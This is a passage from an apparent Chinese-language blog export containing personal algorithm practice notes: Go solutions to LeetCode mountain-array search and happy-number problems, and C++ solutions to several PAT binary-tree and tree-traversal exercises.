class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// find peak index</span></span><br><span class="line">	left, right := <span class="number">0</span>, mountainArr.length()<span class="number">-1</span></span><br><span class="line">	mid := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> left &lt; right &#123;</span><br><span class="line">		mid = left + (right-left)/<span class="number">2</span></span><br><span class="line">		<span class="keyword">if</span> mountainArr.get(mid) &lt;= mountainArr.get(mid+<span class="number">1</span>) &#123;</span><br><span class="line">			left = mid + <span class="number">1</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			right = mid</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	peakIndex := <span class="number">0</span></span><br><span class="line">	<span class="keyword">if</span> mountainArr.get(mid) &lt; mountainArr.get(mid+<span class="number">1</span>) &#123;</span><br><span class="line">		peakIndex = mid + <span class="number">1</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		peakIndex = mid</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// find target</span></span><br><span class="line">	left, right = <span class="number">0</span>, peakIndex</span><br><span class="line">	<span class="keyword">for</span> left &lt; right &#123;</span><br><span class="line">		mid = left + (right-left)/<span class="number">2</span></span><br><span class="line">		<span class="keyword">if</span> mountainArr.get(mid) == target &#123;</span><br><span class="line">			<span class="keyword">return</span> mid</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> mountainArr.get(mid) &lt; target &#123;</span><br><span class="line">			left = mid + <span class="number">1</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			right = mid</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> right &gt; <span class="number">0</span> &#123;</span><br><span class="line">		mid = right</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> mountainArr.get(mid) == target &#123;</span><br><span class="line">		<span class="keyword">return</span> mid</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> mid+<span class="number">1</span> &lt; mountainArr.length() &#123;</span><br><span class="line">		<span class="keyword">if</span> mountainArr.get(mid+<span class="number">1</span>) == target &#123;</span><br><span class="line">			<span class="keyword">return</span> mid + <span class="number">1</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	left, right = peakIndex, mountainArr.length()<span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> left &lt; right &#123;</span><br><span class="line">		mid = left + (right-left)/<span class="number">2</span></span><br><span class="line">		<span class="keyword">if</span> mountainArr.get(mid) == target &#123;</span><br><span class="line">			<span class="keyword">return</span> mid</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> mountainArr.get(mid) &lt; target &#123;</span><br><span class="line">			right = mid</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			left = mid + <span class="number">1</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> right &gt; <span class="number">0</span> &#123;</span><br><span class="line">		mid = right</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> mountainArr.get(mid) == target &#123;</span><br><span class="line">		<span class="keyword">return</span> mid</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> mid+<span class="number">1</span> &lt; mountainArr.length() &#123;</span><br><span class="line">		<span class="keyword">if</span> mountainArr.get(mid+<span class="number">1</span>) == target &#123;</span><br><span class="line">			<span class="keyword">return</span> mid + <span class="number">1</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	array := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>&#125;</span><br><span class="line">	nums := create(array)</span><br><span class="line">	fmt.Println(nums)</span><br><span class="line">	fmt.Println(findInMountainArray(<span class="number">1</span>, nums))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-30"><a href="#2020-4-30" class="headerlink" title="2020/4/30"></a>2020/4/30</h3><p>四月收官了，也做了不少算法题，最近压力也有一些，还算满意吧</p>
<h4 id="leetcode-202-快乐数-Go"><a href="#leetcode-202-快乐数-Go" class="headerlink" title="leetcode 202. 快乐数_Go"></a>leetcode 202. 快乐数_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4月最后一天，leetcode希望我们快乐</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isHappy</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	mp := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line">	temp := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> n != <span class="number">1</span> &#123;</span><br><span class="line">		temp = <span class="number">0</span></span><br><span class="line">		<span class="keyword">for</span> n != <span class="number">0</span> &#123;</span><br><span class="line">			temp = (n%<span class="number">10</span>)*(n%<span class="number">10</span>) + temp</span><br><span class="line">			n /= <span class="number">10</span></span><br><span class="line">		&#125;</span><br><span class="line">		n = temp</span><br><span class="line">		_, ok := mp[n]</span><br><span class="line">		<span class="keyword">if</span> ok &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">		&#125;</span><br><span class="line">		mp[n] = <span class="number">1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(isHappy(<span class="number">19</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>快慢指针法，挂个官方的吧，很好理解</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isHappy</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    slow, fast := n, step(n)</span><br><span class="line">    <span class="keyword">for</span> fast != <span class="number">1</span> &amp;&amp; slow != fast &#123;</span><br><span class="line">        slow = step(slow)</span><br><span class="line">        fast = step(step(fast))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fast == <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">step</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    sum := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n &gt; <span class="number">0</span> &#123;</span><br><span class="line">        sum += (n%<span class="number">10</span>) * (n%<span class="number">10</span>)</span><br><span class="line">        n = n/<span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum</span><br><span class="line">&#125;</span><br><span class="line">作者：LeetCode-Solution</span><br><span class="line">链接：https:<span class="comment">//leetcode-cn.com/problems/happy-number/solution/kuai-le-shu-by-leetcode-solution/</span></span><br><span class="line">来源：力扣（LeetCode）</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法笔记_第九章</title>
    <url>/2020/02/15/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B9%9D%E7%AB%A0/</url>
    <content><![CDATA[<p>第九章上机训练</p>
<span id="more"></span>

<h2 id="9-上机"><a href="#9-上机" class="headerlink" title="9(上机)"></a>9(上机)</h2><h3 id="9-2"><a href="#9-2" class="headerlink" title="9.2"></a>9.2</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1020</span></span><br><span class="line"><span class="comment">//重建二叉树</span></span><br><span class="line"><span class="comment">//利用队列层序遍历,即BFS</span></span><br><span class="line"><span class="keyword">int</span> in[<span class="number">31</span>],post[<span class="number">31</span>]; <span class="comment">//先序；中序；后序</span></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    node *lchild;</span><br><span class="line">    node *rchild;</span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">node* <span class="title">create</span><span class="params">(<span class="keyword">int</span> postl,<span class="keyword">int</span> postr,<span class="keyword">int</span> inl,<span class="keyword">int</span> inr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(postl&gt;postr) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    node* root=<span class="keyword">new</span> node;</span><br><span class="line">    root-&gt;data=post[postr];</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="keyword">for</span>(k=inl;k&lt;=inr;k++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(in[k]==post[postr]) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> numleft=k-inl;</span><br><span class="line">    root-&gt;lchild=create(postl,postl+numleft<span class="number">-1</span>,inl,k<span class="number">-1</span>);</span><br><span class="line">    root-&gt;rchild=create(postl+numleft,postr<span class="number">-1</span>,k+<span class="number">1</span>,inr);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BFS</span><span class="params">(node* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">queue</span>&lt;node*&gt; q;</span><br><span class="line">    q.push(root);</span><br><span class="line">    <span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">        node* now=q.front();</span><br><span class="line">        q.pop();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,now-&gt;data);</span><br><span class="line">        num++;</span><br><span class="line">        <span class="keyword">if</span>(num&lt;n) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(now-&gt;lchild!=<span class="literal">NULL</span>) q.push(now-&gt;lchild);</span><br><span class="line">        <span class="keyword">if</span>(now-&gt;rchild!=<span class="literal">NULL</span>) q.push(now-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;post[i]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;in[i]);</span><br><span class="line">    node* root=create(<span class="number">0</span>,n<span class="number">-1</span>,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">    BFS(root);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1086</span></span><br><span class="line"><span class="keyword">int</span> pre[<span class="number">31</span>],in[<span class="number">31</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    node* lchild;</span><br><span class="line">    node* rchild;</span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">node* <span class="title">create</span><span class="params">(<span class="keyword">int</span> prel,<span class="keyword">int</span> prer,<span class="keyword">int</span> inl,<span class="keyword">int</span> inr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(prel&gt;prer) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    node* root=<span class="keyword">new</span> node;</span><br><span class="line">    root-&gt;data=pre[prel];</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="keyword">for</span>(k=inl;k&lt;=inr;k++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(in[k]==pre[prel]) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> numleft=k-inl;</span><br><span class="line">    root-&gt;lchild=create(prel+<span class="number">1</span>,prel+numleft,inl,k<span class="number">-1</span>);</span><br><span class="line">    root-&gt;rchild=create(prel+numleft+<span class="number">1</span>,prer,k+<span class="number">1</span>,inr);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(node* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    postorder(root-&gt;lchild);</span><br><span class="line">    postorder(root-&gt;rchild);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,root-&gt;data);</span><br><span class="line">    num++;</span><br><span class="line">    <span class="keyword">if</span>(num&lt;n) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    <span class="comment">//string str;</span></span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">5</span>];</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; st;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">int</span> preindex=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> inindex=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>*n;i++)&#123;</span><br><span class="line">        <span class="comment">//cin&gt;&gt;str;</span></span><br><span class="line">        <span class="comment">//cout&lt;&lt;str&lt;&lt;endl;</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,<span class="string">&quot;Push&quot;</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">            <span class="comment">//printf(&quot;%d\n&quot;,temp);</span></span><br><span class="line">            st.push(temp);</span><br><span class="line">            pre[preindex++]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            in[inindex++]=st.top();</span><br><span class="line">            st.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    node* root=create(<span class="number">0</span>,n<span class="number">-1</span>,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">    postorder(root);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1102</span></span><br><span class="line"><span class="comment">//这题我直接模仿书上的写的，自己思考走了岔路</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">110</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> lchild,rchild;</span><br><span class="line">&#125;Node[maxn];</span><br><span class="line"><span class="keyword">bool</span> notRoot[maxn]=&#123;<span class="literal">false</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n,num=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,id);</span><br><span class="line">    num++;</span><br><span class="line">    <span class="keyword">if</span>(num&lt;n) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inOrder</span><span class="params">(<span class="keyword">int</span> root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">    inOrder(Node[root].lchild);</span><br><span class="line">    print(root);</span><br><span class="line">    inOrder(Node[root].rchild);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BFS</span><span class="params">(<span class="keyword">int</span> root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line">    q.push(root);</span><br><span class="line">    <span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">        <span class="keyword">int</span> now=q.front();</span><br><span class="line">        q.pop();</span><br><span class="line">        print(now);</span><br><span class="line">        <span class="keyword">if</span>(Node[now].lchild!=<span class="number">-1</span>) q.push(Node[now].lchild);</span><br><span class="line">        <span class="keyword">if</span>(Node[now].rchild!=<span class="number">-1</span>) q.push(Node[now].rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postOrder</span><span class="params">(<span class="keyword">int</span> root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">    postOrder(Node[root].lchild);</span><br><span class="line">    postOrder(Node[root].rchild);</span><br><span class="line">    swap(Node[root].lchild,Node[root].rchild);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strToNum</span><span class="params">(<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(c==<span class="string">&#x27;-&#x27;</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        notRoot[c-<span class="string">&#x27;0&#x27;</span>]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> c-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findRoot</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(notRoot[i]==<span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> lchild,rchild;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%*c%c %c&quot;</span>,&amp;lchild,&amp;rchild);</span><br><span class="line">        Node[i].lchild=strToNum(lchild);</span><br><span class="line">        Node[i].rchild=strToNum(rchild);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> root=findRoot();</span><br><span class="line">    postOrder(root);</span><br><span class="line">    BFS(root);</span><br><span class="line">    num=<span class="number">0</span>;</span><br><span class="line">    inOrder(root);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="9-3"><a href="#9-3" class="headerlink" title="9.3"></a>9.3</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1079</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">100010</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data=<span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; child;</span><br><span class="line">&#125;Node[maxn];</span><br><span class="line"><span class="keyword">bool</span> HashTable[maxn]=&#123;<span class="literal">true</span>&#125;;  <span class="comment">//是否为根结点</span></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">double</span> p,r,ans=<span class="number">0.0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> index,<span class="keyword">int</span> depth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Node[index].child.size()==<span class="number">0</span>)&#123;</span><br><span class="line">        ans+=Node[index].data*<span class="built_in">pow</span>(<span class="number">1</span>+r,depth);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Node[index].child.size();i++)&#123;</span><br><span class="line">        DFS(Node[index].child[i],depth+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 